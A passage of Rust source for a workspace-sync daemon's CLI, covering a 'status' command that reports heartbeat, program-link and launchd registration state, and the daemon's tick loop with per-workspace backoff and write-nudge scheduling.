/// overwrite it. `running` therefore also probes the recorded pid — but the rest of the
/// heartbeat (last pass, per-workspace state) still renders either way, since it stays useful
/// diagnostics even once the process itself is confirmed dead.
///
/// `running` is a tri-state (6j6v.4t9p): `false` when NO heartbeat exists (nothing even claims to
/// be running — a state, and the answer every shipped platform gives), `true`/`false` from the pid
/// probe when the platform has one, and `null` when a heartbeat is present but this platform
/// cannot probe it at all. That last case is unreachable on the four shipped targets, which are
/// all unix; it exists so the non-unix build says "I don't know" instead of the `true` it used to
/// hardcode — a dead daemon reported as running forever.
pub fn status(json: bool, allow_redirected_home: bool) -> Result<()> {
    let home = ServiceHome::resolve()?;
    let hb = heartbeat::read_from(&home.heartbeat())?;
    // Read ONCE and carried to both renderings (nxf 6j6v.kcan): `running` is the tri-state bool
    // every existing reader parses, and `service_state` is the four answers by name — which is
    // what tells the two `null`s apart.
    let service_state = heartbeat::state(hb.as_ref());
    let running = service_state.as_json();
    // **The alias, read LIVE beside the heartbeat** (nxf 6j6v.dcpk (a)). The heartbeat says which
    // binary the running service started from; this says which one the link names NOW. They are
    // two different facts, and on the owner's machine on 2026-08-29 they were already two different
    // builds, with nowhere to notice it.
    let link = home.program();
    let state = home.program_state();
    // **Compared canonical, displayed raw** (review of PR #393, Code Quality #4). The heartbeat's
    // `program` is fully resolved (`nxs_service::program::running_program` canonicalises it,
    // because under launchd `current_exe()` hands back the alias); the alias's own target is one
    // `read_link` hop. A binary reached through a further symlink — a Homebrew `bin` shim, a
    // versioned install directory — would otherwise read as "two different builds" on every single
    // `status`, while `self-update`'s equivalent check, which canonicalises both sides, correctly
    // said nothing. `describe_alias` below still shows the RAW target: what the link literally says
    // is the thing a reader has to go and change.
    let resolved = match &state {
        nxs_service::ProgramState::Present(t) => nxs_service::ProgramState::Present(
            std::fs::canonicalize(t).unwrap_or_else(|_| t.clone()),
        ),
        other => other.clone(),
    };
    let note = alias_note(
        &resolved,
        &link,
        hb.as_ref().and_then(|h| h.program.as_deref()),
    );
    // **What launchd ACTUALLY holds** (nxf 6j6v.kvda). The heartbeat says what the service last
    // did; the alias says which binary the link names. Neither can say that launchd is holding a
    // registration for this label that came from somewhere else entirely — which is what it was
    // doing on this machine for five days, while `status` reported a truthful, useless "stale
    // heartbeat — the process is gone" and never said WHY the process was gone.
    let registration = read_registration(&home, allow_redirected_home);
    // **Which service this reading is ABOUT** (nxf 6j6v.gd9p). Named unconditionally, production
    // included: a machine can now hold several, and a status that only says "the service" is a
    // report whose subject the reader has to guess.
    let instance = home.instance().name();
    // Whom this instance shares a workspace with, if anybody — the one thing separate homes do NOT
    // make impossible, so it is reported rather than assumed away.
    //
    // **`null`, not `[]`, when the check could not run** (review of PR #395, Integrity #2). Our own
    // registry being unreadable is not "no overlap"; it is "nobody looked", and the two must not
    // render identically. Same tri-state idiom as `running` above, and for the same reason: a
    // reader must never have to tell "there is nothing to report" from "there is no answer".
    let (shared, shared_note) = match home.attended_by_more_than_one() {
        Ok(shared) => {
            let note = nxs_service::shared_workspace_note(&shared);
            (Some(shared), note)
        }
        Err(e) => (
            None,
            Some(format!(
                "this instance's workspace registry could not be read ({}), so nothing checked \
                 whether another instance attends the same workspaces",
                e.msg
            )),
        ),
    };
    if json {
        // `{"running": bool|null, "heartbeat": {…}|null}` — the shape the DoD names, plus the
        // `null` arm above — and since 6j6v.dcpk the `program` block beside it. Rendered ALWAYS,
        // `null`s included, exactly as the two before it: a reader must never have to tell "the key
        // is absent" from "there is nothing to report".
        println!(
            "{}",
            serde_json::json!({
                "running": running,
                // nxf 6j6v.kcan. `running` cannot say WHICH of its two `null`s this is, and one of
                // them — a process holds the recorded id but did not write the heartbeat — is the
                // state that used to be reported as a plain `false`, sending people to reinstall a
                // service that was working.
                "state": service_state.as_str(),
                "instance": instance,
                "home": home.root().display().to_string(),
                "heartbeat": hb,
                "program": {
                    "link": link.display().to_string(),
                    "target": state.target().map(|t| t.display().to_string()),
                    "exists": matches!(state, nxs_service::ProgramState::Present(_)),
                    "note": note,
                },
                // `null` when nobody looked — see [`read_registration`]. Same tri-state idiom as
                // `running` and `shared_workspaces`: "there is no registration" and "there is no
                // answer" must not render identically.
                "registration": registration
                    .as_ref()
                    .and_then(|r| r.as_ref().ok())
                    .map(registration_json),
                "shared_workspaces": shared.as_ref().map(|shared| shared.iter().map(|s| serde_json::json!({
                    "path": s.path,
                    "instances": s.instances,
                })).collect::<Vec<_>>()),
            })
        );
        return Ok(());
    }
    println!("instance: {instance} ({})", home.root().display());
    match hb {
        None => println!("not running (no heartbeat file found)"),
        Some(hb) => {
            println!(
                "{} — pid {}, started {}",
                describe_state(service_state),
                hb.pid,
                hb.started_at
            );
            // Which BUILD it is running — the question that had no answer anywhere before
            // 6j6v.dcpk. A heartbeat written by an older service carries neither, and says so
            // rather than printing an empty line.
            match (&hb.program, &hb.version) {
                (Some(program), Some(version)) => println!("program: {program} (nxs {version})"),
                (Some(program), None) => println!("program: {program}"),
                (None, _) => println!(
                    "program: unrecorded (this heartbeat predates the field; it is stamped from \
                     the next restart of the service on)"
                ),
            }
            println!("alias: {}", describe_alias(&home.program_state(), &link));
            println!("last pass: {}", hb.last_pass_at);
            // **What the log knew and nobody read** (nxf 6j6v.kcan). A gap in `last pass` with no
            // explanation reads as a service that was down; this is the service saying it was
            // there and could not write.
            if let Some(failures) = &hb.write_failures {
                println!("{}", describe_write_failures(failures));
            }
            if hb.workspaces.is_empty() {
                println!("  (no workspace has completed a pass yet)");
            }
            for w in &hb.workspaces {
                match &w.last_error {
                    Some(err) => println!("  {}: ERROR {err}", w.path),
                    None => println!(
                        "  {}: ok at {} (pushed {}, pulled {})",
                        w.path,
                        w.last_ok.as_deref().unwrap_or("never"),
                        w.pushed,
                        w.pulled
                    ),
                }
            }
        }
    }
    // Printed whether or not there is a heartbeat: a registration loaded from a plist that is gone
    // is the reason there is no heartbeat, and it has to be readable in the case where the service
    // never got to write one.
    //
    // And printed whether or not it could be READ, on the platform that has a launchd. Saying
    // nothing when the question could not be asked is the one thing this whole block exists to
    // stop: a reader must never have to tell "there is nothing registered" from "nobody looked".
    if let Some(line) = registration_line(
        registration.as_ref().map(|r| r.as_ref()),
        &home.instance().label(),
    ) {
        println!("registration: {line}");
    }
    if let Some(note) = note {
        println!("note: {note}");
    }
    if let Some(note) = shared_note {
        println!("note: {note}");
    }
    Ok(())
}

/// What launchd holds under this instance's label, or `None` when nobody could look.
///
/// **Gated on the login session, deliberately** (nxf 6j6v.kvda). `launchctl print gui/<uid>` reads
/// the REAL login session whatever `$HOME` says — which is the same asymmetry that caused the
/// poisoning this reports. A process whose home has been pointed elsewhere (every black-box test in
/// this repo) would therefore read the developer's own production registration and compare it
/// against a plist path under a TempDir, reporting a machine-dependent "FOREIGN" on a machine that
/// is perfectly healthy. `RealCtl::for_login_session` is exactly that question, so the gate is the
/// same one the installer uses rather than a second opinion about it.
#[cfg(target_os = "macos")]
fn read_registration(
    home: &ServiceHome,
    allow_redirected_home: bool,
) -> Option<std::result::Result<nxs_service::launchd::RegistrationVerdict, String>> {
    let rule = if allow_redirected_home {
        nxs_service::launchd::HomeRule::RedirectedIsAllowed
    } else {
        nxs_service::launchd::HomeRule::MustBeTheLoginSessions
    };
    Some(
        nxs_service::launchd::RealCtl::for_login_session(rule)
            .and_then(|ctl| {
                let plist = nxs_service::launchd::plist_path_for(home.instance())?;
                Ok(nxs_service::launchd::registration_verdict(
                    &home.instance().label(),
                    &plist,
                    &home.program(),
                    &ctl,
                ))
            })
            // The RAW message, not a sentence: turning it into one is [`not_checked_line`]'s job,
            // and that has to happen on the portable side or it is code no non-macOS build can
            // reach (see the note on [`registration_line`]).
            .map_err(|e| e.msg),
    )
}

/// No launchd, no registration, and no line either: on a platform without one there is no question
/// to leave unanswered — which is a different thing from an unanswered question.
#[cfg(not(target_os = "macos"))]
fn read_registration(
    _home: &ServiceHome,
    _allow_redirected_home: bool,
) -> Option<std::result::Result<nxs_service::launchd::RegistrationVerdict, String>> {
    None
}

/// The `registration:` line for a lookup that did not happen — and it says WHICH of the two
/// reasons it was (review of PR #428, Code Quality #2).
///
/// `RealCtl::for_login_session` refuses for two unrelated causes: the home mismatch this whole
/// gate is about, and a machine whose home or user database cannot be resolved at all. The first
/// gets a fixed, deliberately PATH-FREE sentence — it is the one every black-box test in this repo
/// reaches, since they all pin `$HOME`, so it must read identically on every machine. The second
/// keeps its own words, because blaming the gate for it would send the reader to the wrong place.
fn not_checked_line(refusal: &str) -> String {
    if refusal.starts_with(LOGIN_SESSION_REFUSAL) {
        NOT_CHECKED.to_string()
    } else {
        format!("not checked — the loaded launchd registration could not be looked up ({refusal})")
    }
}

/// The opening words of `nxs_service::launchd::login_session_complaint`. Matched rather than
/// re-derived, and the test `the_gates_refusal_is_classified_as_the_gate_and_anything_else_is_not`
/// feeds the REAL complaint through so this cannot drift into matching nothing.
const LOGIN_SESSION_REFUSAL: &str = "refusing to talk to launchd";

/// What the line says when the gate refused to look — path-free on purpose, so it is the same
/// sentence on every machine that produces it.
///
/// The only way to reach it is a process whose `$HOME` is not the login session's, which in
/// practice means a test: `nxs_test_support` pins a throwaway home into every black-box
/// invocation. A person running `nxs sync daemon status` in their own shell gets a real verdict —
/// and an operator whose machine redirects `$HOME` on purpose gets one with
/// `--allow-redirected-home`, which is named here so they do not have to find it elsewhere.
const NOT_CHECKED: &str = "not checked — this process's home is not the login session's, and the \
                           gui domain it would have to read belongs to that session rather than to \
                           this process (nxf 6j6v.kvda). Pass --allow-redirected-home if this \
                           machine's home is redirected on purpose";

/// The whole `registration:` line, including the case where there was no answer to render.
///
/// `None` — print nothing at all — is reserved for a platform that has no launchd: there the
/// question does not exist, which is not the same as an unanswered one. Where there IS a launchd a
/// line is always printed, and [`NOT_CHECKED`] is what it says when the read was refused.
///
/// **Nothing platform-gated may live below this function**, and that is not a style choice: the
/// only `#[cfg]` split in this area is [`read_registration`] itself, whose two arms both exist on
/// their own platform. Everything it feeds — this function, [`describe_registration`],
/// [`not_checked_line`], [`NOT_CHECKED`] — is reached from portable code, so `-D dead-code` has
/// nothing to find anywhere. Measured, not predicted: a `#[cfg]` split of THIS function made
/// `describe_registration` unreachable off macOS and turned `quality-gates` and
/// `Platform gates (windows-latest)` red while every macOS build stayed green (runs 33869127576,
/// 33869129472), and the second cut did the same to a `NotLooked` variant, the other way round.
fn registration_line(
    read: Option<std::result::Result<&nxs_service::launchd::RegistrationVerdict, &String>>,
    label: &str,
) -> Option<String> {
    match read {
        None => None,
        Some(Ok(verdict)) => Some(describe_registration(verdict, label)),
        Some(Err(refusal)) => Some(not_checked_line(refusal)),
    }
}

/// The `registration:` line — one named answer per [`RegistrationVerdict`], each carrying what to
/// do about it. Pure, so all four are provable without a launchd (nxf 6j6v.kvda).
///
/// The sentence that matters is `Foreign`'s. Before it existed, a registration loaded from a
/// deleted TempDir rendered as nothing at all, and the only thing `status` said was that the
/// heartbeat was stale — true, and it sent the reader looking at the process instead of at the
/// registration that was keeping the real plist from ever loading.
fn describe_registration(
    verdict: &nxs_service::launchd::RegistrationVerdict,
    label: &str,
) -> String {
    use nxs_service::launchd::RegistrationVerdict as V;
    match verdict {
        V::NotLoaded => format!(
            "NONE — launchd holds no job under {label}, so nothing starts this service at login \
             or after a crash. `nxs sync daemon install` registers it (if an install just failed, \
             this is the half-state it stopped in)."
        ),
        V::Ours {
            state,
            program,
            program_is_ours,
            program_exists,
            ..
        } => {
            let mut line = match state {
                Some(state) => {
                    format!("{label}, loaded from this instance's own plist (state {state})")
                }
                None => format!("{label}, loaded from this instance's own plist"),
            };
            if let Some(program) = program {
                if !*program_exists {
                    line.push_str(&format!(
                        " — but the program it was told to run ({}) does not exist, so every \
                         start attempt fails. `nxs sync daemon install` re-points it.",
                        program.display()
                    ));
                } else if !*program_is_ours {
                    line.push_str(&format!(
                        " — but it runs {}, which is not what this instance's plist names now: \
                         launchd is holding an older reading of it. `nxs sync daemon install` \
                         reloads it.",
                        program.display()
                    ));
                }
            }
            line
        }
        V::Foreign {
            loaded,
            own,
            loaded_exists,
            state,
            last_exit_code,
            ..
        } => {
            let gone = if *loaded_exists {
                ""
            } else {
                ", which no longer exists"
            };
            let mut line = format!(
                "FOREIGN — launchd holds {label}, but it was bootstrapped from {}{gone}, not from \
                 this instance's plist ({}). That registration owns the label: this instance's own \
                 plist cannot load while it stands, so nothing here can start the service",
                loaded.display(),
                own.display()
            );
            if let Some(state) = state {
                line.push_str(&format!(" (launchd state {state}"));
                match last_exit_code {
                    Some(code) => line.push_str(&format!(", last exit code {code})")),
                    None => line.push(')'),
                }
            }
            line.push_str(
                ". `nxs sync daemon install` boots it out and replaces it; nothing else will.",
            );
            line
        }
        V::Unknown(why) => format!(
            "UNKNOWN — launchd was asked what it holds under {label} and the answer could not be \
             read ({why}). This is not the same as holding nothing."
        ),
    }
}

/// The `registration` block of `--json`. Every arm renders the SAME keys, `null`s included, for the
/// reason the blocks beside it do: a reader must never have to tell an absent key from an absent
/// fact.
fn registration_json(verdict: &nxs_service::launchd::RegistrationVerdict) -> serde_json::Value {
    use nxs_service::launchd::RegistrationVerdict as V;
    // **Two `exists` questions, two keys** (review of PR #428, Code Quality #3). The first cut
    // folded them into one `exists` whose SUBJECT changed with `verdict` — the loaded plist under
    // `foreign`, the program under `ours`. A consumer that read `exists` without branching on
    // `verdict` first would have been reading a different fact than it thought, which is the
    // ambiguity this whole block exists to remove.
    let (kind, loaded, program, state, loaded_exists, program_exists) = match verdict {
        V::NotLoaded => ("none", None, None, None, None, None),
        V::Ours {
            loaded,
            state,
            program,
            program_exists,
            ..
        } => (
            "ours",
            Some(loaded.clone()),
            program.clone(),
            state.clone(),
            // Ours means launchd loaded it FROM this plist, so it was there when it was read.
            Some(true),
            Some(*program_exists),
        ),
        V::Foreign {
            loaded,
            program,
            state,
            loaded_exists,
            ..
        } => (
            "foreign",
            Some(loaded.clone()),
            program.clone(),
            state.clone(),
            Some(*loaded_exists),
            None,
        ),
        V::Unknown(_) => ("unknown", None, None, None, None, None),
    };
    serde_json::json!({
        "verdict": kind,
        "loaded_from": loaded.map(|p| p.display().to_string()),
        "loaded_exists": loaded_exists,
        "program": program.map(|p| p.display().to_string()),
        "program_exists": program_exists,
        "state": state,
    })
}

/// The state line's opening clause, one per [`ServiceState`] (nxf 6j6v.kcan). Pure, so all four
/// wordings are provable without a service, a heartbeat or a `$HOME`.
///
/// The `Unconfirmed` sentence carried BOTH of its readings until nxf 6j6v.d43g — the reused id and
/// the service that stamped itself late — because the probe could not tell them apart. It can now,
/// by the direction of the disagreement, so the late one reads as `running` and this sentence says
/// the single thing that is left: the process in front of you is not your service.
fn describe_state(state: ServiceState) -> &'static str {
    match state {
        ServiceState::Running => "running",
        ServiceState::NotRunning => "NOT running (stale heartbeat — the process is gone)",
        ServiceState::Unconfirmed => {
            "state UNCONFIRMED (a live process holds this id, but it began after this heartbeat \
             says the service did — the service is gone and its id was handed on, so that process \
             is somebody else's: start the service, do not kill the pid)"
        }
        ServiceState::Unknown => {
            "state UNKNOWN (a heartbeat is present, but this platform cannot probe \
             whether its process is still alive)"
        }
    }
}

/// The `heartbeat writes:` line — what a gap in `last pass` was actually caused by (nxf 6j6v.kcan).
///
/// Pure, and rendered only when there is something to report: a service that has never missed a
/// beat prints no line about missing them.
fn describe_write_failures(failures: &nxs_service::heartbeat::WriteFailures) -> String {
    format!(
        "heartbeat writes: {} failed since this service started — the last at {}: {}",
        failures.count, failures.last_at, failures.last_error
    )
}

/// The `alias:` line — the link and what it resolves to, in one string.
fn describe_alias(state: &nxs_service::ProgramState, link: &Path) -> String {
    match state {
        nxs_service::ProgramState::Absent => {
            format!("{} (not installed)", link.display())
        }
        nxs_service::ProgramState::Present(target) if target == link => link.display().to_string(),
        nxs_service::ProgramState::Present(target) => {
            format!("{} -> {}", link.display(), target.display())
        }
        nxs_service::ProgramState::Dangling(target) => {
            format!("{} -> {} (MISSING)", link.display(), target.display())
        }
    }
}

/// What is worth saying about the alias beyond printing it — `None` when the two facts agree and
/// there is nothing to report (nxf 6j6v.dcpk).
///
/// Pure over the three inputs, so both answers it can give are provable without a launchd, a
/// service, or a `$HOME`. `running` is the RESOLVED program out of the heartbeat, which is why it
/// can be compared with the alias's own resolved target at all.
fn alias_note(
    state: &nxs_service::ProgramState,
    link: &Path,
    running: Option<&str>,
) -> Option<String> {
    match state {
        // Nothing installed from this home. The `running:` line above already says whether a
        // service is up, and an absent alias adds nothing to it.
        nxs_service::ProgramState::Absent => None,
        nxs_service::ProgramState::Dangling(target) => Some(format!(
            "the service's program link {} points at {}, which is not there. launchd's only report \
             of that is a service that never starts. Re-point it by running \
             `nxs sync daemon install` from the binary you want the service to run.",
            link.display(),
            target.display()
        )),
        nxs_service::ProgramState::Present(target) => {
            let running = running?;
            (running != target.to_string_lossy()).then(|| {
                format!(
                    "the running service is {running}, but {} now points at {} — two different \
                     builds, and the next restart silently switches to the second. Run \
                     `nxs sync daemon install` from the binary you want, or restart the service to \
                     take the link's.",
                    link.display(),
                    target.display()
                )
            })
        }
    }
}

/// Render `t` as RFC3339 for a heartbeat timestamp — the SHARED formatter (6j6v.0wvp), not a copy.
/// The liveness check now compares a recorded instant against the operating system's own answer, so
/// two spellings of "the same instant" that drifted apart would make a live service look like
/// somebody else's process.
use nxs_service::heartbeat::rfc3339 as to_rfc3339;

/// Resolve every registered entry into a live [`Workspace`], skipping — WITHOUT error — any whose
/// path no longer holds a `.nxs/` (a stale or typo'd registry entry, or a workspace someone
/// deleted; §5.5). Consistent with the registry's own contract (`workspaces::register_workspace`):
/// nothing treats an entry as pre-validated, so a resolution failure here is exactly that same
/// "never checked" case surfacing at sweep time — distinct from `skipped_unbound`, which is a
/// real, resolvable workspace that simply never ran `sync bind`.
fn resolve_registered(entries: &[WorkspaceEntry]) -> (Vec<Workspace>, Vec<String>) {
    let mut resolved = Vec::with_capacity(entries.len());
    let mut stale = Vec::new();
    for entry in entries {
        let candidate = Path::new(&entry.path);
        // A registry entry names the WORKSPACE ROOT (the dir holding `.nxs/`) — never a path
        // merely inside one. `Workspace::resolve` → `discover` WALKS UP the tree looking for the
        // nearest ancestor `.nxs/`, which is exactly right for a human typing a subdirectory and
        // exactly wrong here (finding 5, final review): a deleted or moved registry entry would
        // silently resolve to whatever real workspace happens to sit above it, and get swept
        // under the DEAD entry's label. `discover` is also not a pure read — it renames a legacy
        // `.nexusflow/` → `.nxs/` and mints+persists a `replica_uuid` on first load — so a
        // background daemon doing that once per second per stale entry is a surprise nobody
        // asked for. Checking the marker file directly, with no upward walk, is what makes "no
        // `.nxs/` HERE" and "skip" the same fact this function's own doc already promises.
        if !candidate.join(".nxs").join("replica.toml").is_file() {
            stale.push(entry.path.clone());
            continue;
        }
        match Workspace::resolve(None, candidate) {
            Ok(ws) => resolved.push(ws),
            Err(_) => stale.push(entry.path.clone()),
        }
    }
    (resolved, stale)
}

/// Print one daemon log line — `--json` emits a structured `{"event":"log","msg":..}` record (so
/// a log consumer can tell a status line from a sync outcome), otherwise a plain human line.
fn log_line(json: bool, msg: &str) {
    if json {
        println!("{}", serde_json::json!({ "event": "log", "msg": msg }));
    } else {
        println!("{msg}");
    }
}

/// Backoff tuning (§5.6): 300s base, doubling, capped at 1800s (30 min) — module-level so both
/// [`tick`] and its tests share the exact numbers `serve` runs with, rather than each hand-typing
/// them and risking drift.
const BACKOFF_BASE: Duration = Duration::from_secs(300);
const BACKOFF_CAP: Duration = Duration::from_secs(1800);

/// Everything a tick must remember about the PREVIOUS ticks — the per-workspace backoff clock,
/// the write-nudge marker's last-seen mtime, the once-per-run endpoint warning set — plus the
/// `Scheduler`/`WakeDetector` themselves. Built once per `serve()` call and threaded through
/// every [`tick`], exactly the way `Scheduler`/`WakeDetector` are already clock-injected rather
/// than reading the clock themselves: this is what makes the loop's per-tick orchestration
/// (backoff exclusion, nudge-to-sweep threading, warn-once) provable by a test without a real
/// clock, a spawned process, or a relay.
pub struct DaemonState {
    scheduler: Scheduler,
    wake_detector: WakeDetector,
    /// Last-seen mtime of each workspace's `.nxs/last-write` marker, keyed by its `.nxs/` dir.
    last_marker: HashMap<PathBuf, SystemTime>,
    /// Workspaces whose marker this service has looked for and NOT found — so its appearance is
    /// recognised as a write (nxf 6j6v.1c6k), unlike a marker that was there from the start.
    marker_missing: HashSet<PathBuf>,
    /// Per-workspace backoff, keyed by its `.nxs/` dir.
    backoffs: HashMap<PathBuf, Backoff>,
    /// The earliest `Instant` a backed-off workspace is eligible for another attempt.
    next_attempt: HashMap<PathBuf, Instant>,
    /// Workspace labels already warned about a missing endpoint, for the life of this state —
    /// i.e. one daemon run (§5.5): the first sighting warns, every later one is silent.
    warned_no_endpoint: HashSet<String>,
    /// The same warn-once bookkeeping for a deadline book this build cannot fully honour
    /// (6j6v.8see). Separate set: the two are different facts about a workspace and one must not
    /// silence the other.
    warned_unrunnable: HashSet<String>,
    /// And again for a workspace this service shares with another INSTANCE (6j6v.gd9p) — the one
    /// thing separate homes do not make impossible. Its own set for the same reason as the two
    /// above: a workspace can be both doubly attended and missing an endpoint, and hearing about
    /// one must not cost the other.
    warned_shared: HashSet<String>,
    /// And for a workspace whose relay records no presence (6j6v.f0b5): said once per run, because
    /// it stays true on every pass until somebody upgrades the relay, and a line every five minutes
    /// forever is a line nobody reads.
    warned_no_presence: HashSet<String>,
    /// When the relay was last asked "anything new?" between passes (nxf 6j6v.1c6k) — see [`peek`].
    last_peek: Option<Instant>,
    /// A workspace whose peek failed is not peeked again before this instant: a relay that cannot
    /// answer the cheap question is left to the full pass and its own backoff, not asked every 15 s.
    peek_quiet_until: HashMap<PathBuf, Instant>,
}

impl DaemonState {
    /// Seed fresh per-run state. `now`/`wall` seed the `Scheduler`/`WakeDetector` exactly as
    /// their own constructors do (neither owns a clock); every other field starts empty — no
    /// workspace has been seen, backed off, or warned about yet.
    pub fn new(
        now: Instant,
        wall: SystemTime,
        interval: Duration,
        debounce: Duration,
        max_wait: Duration,
        wake_threshold: Duration,
    ) -> Self {
        DaemonState {
            scheduler: Scheduler::new(now, interval, debounce, max_wait),
            wake_detector: WakeDetector::new(now, wall, wake_threshold),
            last_marker: HashMap::new(),
            marker_missing: HashSet::new(),
            backoffs: HashMap::new(),
            next_attempt: HashMap::new(),
            warned_no_endpoint: HashSet::new(),
            warned_unrunnable: HashSet::new(),
            warned_shared: HashSet::new(),
            warned_no_presence: HashSet::new(),
            last_peek: None,
            peek_quiet_until: HashMap::new(),
        }
    }
}

/// One tick of the daemon loop (§5): advance the wake detector, fold this tick's write-nudge
/// into the scheduler (a marker's FIRST sighting is deliberately not a nudge — see below — so a
/// daemon that just started does not treat every already-dirty workspace as a fresh write), and
/// — if a pass is due — `sweep` every eligible workspace (excluding any still inside its backoff
/// window), then fold the outcome back into `state`'s backoff and once-per-run
/// endpoint-warning bookkeeping.
///
/// `resolved` is this tick's already-resolved, already-registry-filtered workspace list — the IO
/// (reading the registry, walking up for `.nxs/`) stays in `serve`, the caller, so `tick` itself
/// touches only what its arguments name plus `state`: the last-write marker `stat` and whatever
/// `pass` does. That is what makes it callable from a test with a `SpyPass` and a synthetic
/// clock, exactly like `Scheduler`/`WakeDetector`.
///
/// Returns the `SweepReport` from the sweep that ran, with `skipped_no_endpoint` already reduced
/// to labels warned for the FIRST time this tick (the once-per-run dedup lives here, not in
/// `serve`) — or `SweepReport::default()` (every bucket empty) on a tick where nothing was due.
pub fn tick(
    state: &mut DaemonState,
    now: Instant,
    wall: SystemTime,
    resolved: &[Workspace],
    pass: &dyn Pass,
    global: Option<&str>,
) -> SweepReport {
    if state.wake_detector.tick(now, wall) {
        state.scheduler.on_trigger(Trigger::Wake, now);
    }

    // Any workspace's last-write marker moving since we last looked is one Nudge. The Scheduler
    // owns the debounce/burst logic centrally (§5.2) — which workspace nudged does not matter,
    // since a due pass sweeps every eligible workspace anyway.
    for ws in resolved {
        let marker = ws.dir.join("last-write");
        match std::fs::metadata(&marker).and_then(|m| m.modified()) {
            Ok(modified) => match state.last_marker.insert(ws.dir.clone(), modified) {
                Some(prev) if prev != modified => {
                    state.scheduler.on_trigger(Trigger::Nudge, now);
                }
                // **A marker that APPEARS is a write too** (nxf 6j6v.1c6k). The first sighting
                // is not a nudge because a marker that was already there at start says nothing
                // new; one this service has seen MISSING and now finds says the first write
                // since. Without this, the first message a freshly bound workspace writes waited
                // for the safety-net interval before it reached the relay — up to 300 s for a chat
                // meant for another machine.
                None if state.marker_missing.remove(&ws.dir) => {
                    state.scheduler.on_trigger(Trigger::Nudge, now);
                }
                _ => {}
            },
            Err(_) => {
                if !state.last_marker.contains_key(&ws.dir) {
                    state.marker_missing.insert(ws.dir.clone());
                }
            }
        }
    }

    if !state.scheduler.due(now) {
        return SweepReport::default();
    }

    let eligible: Vec<Workspace> = resolved
        .iter()
        .filter(|ws| match state.next_attempt.get(&ws.dir) {
            Some(&until) => now >= until,
            None => true,
        })
        .cloned()
        .collect();
    let mut report = sweep(&eligible, pass, global);

    for (label, _) in &report.synced {
        let key = PathBuf::from(label);
        state
            .backoffs
            .entry(key.clone())
            .or_insert_with(|| Backoff::new(BACKOFF_BASE, BACKOFF_CAP))
            .after_success();
        state.next_attempt.remove(&key);
    }
    for (label, _) in &report.errors {
        let key = PathBuf::from(label);
        let delay = state
            .backoffs
            .entry(key.clone())
            .or_insert_with(|| Backoff::new(BACKOFF_BASE, BACKOFF_CAP))
            .after_failure();
        state.next_attempt.insert(key, now + delay);
    }
    // Once-per-run dedup: `HashSet::insert` returns `true` only the first time a label is seen,
    // so `retain` keeps exactly the newly-warned-about labels and drops the repeats.
    report
        .skipped_no_endpoint
        .retain(|label| state.warned_no_endpoint.insert(label.clone()));

    state.scheduler.passed(now);
    report
}

/// `nxs sync daemon`: the process that closes the freshness gap `nxs sync run` cannot — it runs
/// independently of any human typing a command (§5). Every tick (1s) it re-reads the workspace
/// registry, so a workspace bound or registered after the daemon started is picked up with no
/// restart, resolves each entry into a live [`Workspace`] (a stale entry is skipped, never an
/// error — [`resolve_registered`]), and hands the result to [`tick`], which owns the actual
/// due/sweep/backoff/warn-once decision. `serve` itself is a thin real-clock driver: build the
/// state, loop, call `tick`, render whatever it reports, sleep.
///
/// Deliberately workspace-free at the call boundary — unlike `run`/`bind`, which resolve the ONE
/// workspace the caller happens to be standing in. The daemon serves EVERY registered workspace,
/// so it must start from any directory, including one with no `.nxs/` anywhere up the tree.
///
/// # The two conditions the owner attached to the service (2026-08-25, `47jy.v8p6`)
///
/// **It must survive a lost network without bringing the machine to its knees.** Nothing here
/// retries in a tight loop. A workspace whose pass fails enters a per-workspace exponential backoff
/// (`BACKOFF_BASE` 300s, doubling, capped at `BACKOFF_CAP` 1800s) and is excluded from every tick
/// until its window opens — so a relay that is simply unreachable costs one attempt every five to
/// thirty minutes per workspace, not one per second. The loop itself sleeps a whole second between
/// ticks and does no work at all on a tick where nothing is due. A workspace with no resolvable
/// endpoint is skipped and warned about ONCE per run rather than each time round.
///
/// **It must restart itself after a crash.** That is not this function's doing and cannot be: a
/// process that has died runs nothing. It is `KeepAlive` in the launchd agent
/// (`nxs_service::launchd::render_plist`), together with `RunAtLoad`, which is also what brings the
/// service back at every login — and after a reboot, that is the boot.
pub fn serve(json: bool, interval: Option<u64>) -> Result<()> {
    // Tuning matches the spec (§5.1/§5.2): a write burst coalesces within `DEBOUNCE`, a
    // continuous stream still pushes by `MAX_WAIT`, >~30s of monotonic/wall-clock divergence is a
    // sleep/wake, and the interval is a safety net (300s), not the steady-state mechanism.
    const DEBOUNCE: Duration = Duration::from_secs(2);
    const MAX_WAIT: Duration = Duration::from_secs(10);
    const WAKE_THRESHOLD: Duration = Duration::from_secs(30);
    const TICK: Duration = Duration::from_secs(1);

    // Held for the daemon's ENTIRE lifetime (task 12 DoD): never read again after this, but its
    // `Drop` is the whole point — it hands the lock back on any early `?` return below and on a
    // normal exit, which is what lets a service that has just stopped be started again straight
    // away (nxf 6j6v.1zs2). A hard kill runs no destructor, and there the kernel's own
    // release-on-last-close is what frees it; either way the lock file left behind is an ordinary
    // unlocked file, not something the next `acquire` has to reclaim.
    let home = ServiceHome::resolve()?;
    let _lock = ServiceLock::acquire(&home.lock())?;

    let interval = Duration::from_secs(interval.unwrap_or(300));
    let start = Instant::now();
    let started_wall = SystemTime::now();
    let mut state = DaemonState::new(
        start,
        started_wall,
        interval,
        DEBOUNCE,
        MAX_WAIT,
        WAKE_THRESHOLD,
    );
    // The service's pass announces this machine after every sync (6j6v.f0b5), promising to be back
    // within the same interval the scheduler below is built with — so the promise and the cadence
    // are one number and cannot drift apart.
    let pass = ServicePass::new(home.clone(), interval.as_secs());
    let cadence = announced_cadence(interval.as_secs());
    if cadence != interval.as_secs() {
        log_line(
            json,
            &format!(
                "this machine announces itself to relays with a cadence of {cadence} s rather than \
                 the {} s interval — a presence promise is never shorter than the {} s retry \
                 backoff nor longer than the {} s a relay stores",
                interval.as_secs(),
                BACKOFF_BASE.as_secs(),
                nxs_sync::presence::MAX_INTERVAL_SECS
            ),
        );
    }
    let clock = RealSpawn::for_instance(home.instance());
    // What decides whether a pass left an order for THIS machine (nxf 6j6v.1c6k).
    let orders = ServiceOrders { home: home.clone() };
    // **The machine stays awake while a run is working** (nxf 6j6v.7q3r). Held by THIS process and
    // by nothing else, because an idle-sleep assertion dies with the process that took it — which
    // is also the third of the three guarantees that it is always given back (`wake`'s module doc).
    // The reason string is what a person reading `pmset -g assertions` sees, so it names the
    // instance: on a machine running two services, "something called nexus-flow" is not an answer.
    let wake = nxs_service::SystemWake;
    let mut awake = nxs_service::WakeKeeper::new(
        &wake,
        format!("{} is running an agent session", home.instance()),
    );
